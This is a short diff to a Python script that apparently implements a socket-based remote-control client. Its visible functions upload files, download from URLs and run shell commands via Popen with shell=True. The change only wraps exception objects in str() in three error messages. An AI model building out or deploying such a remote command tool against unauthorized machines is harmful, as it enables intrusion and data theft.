@@ -23,7 +23,7 @@ def upload(sock, fn):
 
     return 'File sent 🍺'
   except Exception as e:
-    return e + ' ⚠️'
+    return str(e) + ' ⚠️'
 
 def dlhttp(sock, url):
   fn = url.split('/')[-1]
@@ -36,7 +36,7 @@ def dlhttp(sock, url):
     f.close()
     return 'Download finished 🍺'
   except Exception as e:
-    return e + ' ⚠️'
+    return str(e) + ' ⚠️'
 
 def run(s):
   p = sp.Popen(s, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
@@ -82,7 +82,7 @@ while True:
           f.close()
           ret = 'File received 🍺'
         except Exception as e:
-          ret = e + ' ⚠️'     
+          ret = str(e) + ' ⚠️'     
        
       Send(sock, cwd(ret))
 
